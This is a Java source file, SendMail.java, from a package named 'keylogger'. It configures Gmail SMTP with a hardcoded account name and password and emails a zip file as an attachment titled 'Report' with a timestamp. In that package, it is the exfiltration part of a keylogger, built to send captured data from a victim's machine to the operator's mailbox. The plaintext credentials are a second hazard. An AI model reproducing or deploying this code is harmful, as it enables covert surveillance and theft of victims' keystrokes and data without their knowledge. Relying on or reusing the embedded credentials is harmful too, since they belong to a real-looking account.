/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package keylogger;

import java.io.File;
import java.util.Date;
import java.util.Properties;
import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

public class SendMail {

    final String username = "honza.kusy@gmail.com";
    final String password = "FAKUM392a";

    private Properties props = new Properties();
    private static SendMail instance;

    public static SendMail init() {
        if (instance == null) {
            instance = new SendMail();
        }
        instance.props.put(
                "mail.smtp.auth", "true");
        instance.props.put("mail.smtp.starttls.enable", "true");
        instance.props.put("mail.smtp.ssl.trust", "smtp.gmail.com");
        instance.props.put(
                "mail.smtp.host", "smtp.gmail.com");
        instance.props.put(
                "mail.smtp.port", "587");

        return instance;
    }

    public void sendMail(String from, String to, String zipName) {
        Session session = Session.getInstance(props,
                new javax.mail.Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(username, password);
                    }
                });

        try {
            System.out.println("Sending mail: " + new Date().toString());
            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(from));
            message.setRecipients(Message.RecipientType.TO,
                    InternetAddress.parse(to));
            message.setSubject("Report: " + new Date().toString() );
            BodyPart messageBodyPart = new MimeBodyPart();

            // Fill the message
            messageBodyPart.setText("Report: " +new Date().toString() );
            
            // Create a multipar message
            Multipart multipart = new MimeMultipart();

            // Set text message part
            multipart.addBodyPart(messageBodyPart);

            // Part two is attachment
            messageBodyPart = new MimeBodyPart();
            DataSource source = new FileDataSource(zipName);
            messageBodyPart.setDataHandler(new DataHandler(source));
            messageBodyPart.setFileName(zipName);
            multipart.addBodyPart(messageBodyPart);

            // Send the complete message parts
            message.setContent(multipart);

            Transport.send(message);

            System.out.println("Sended.");

        } catch (MessagingException e) {
            throw new RuntimeException(e);
        }
    }

}
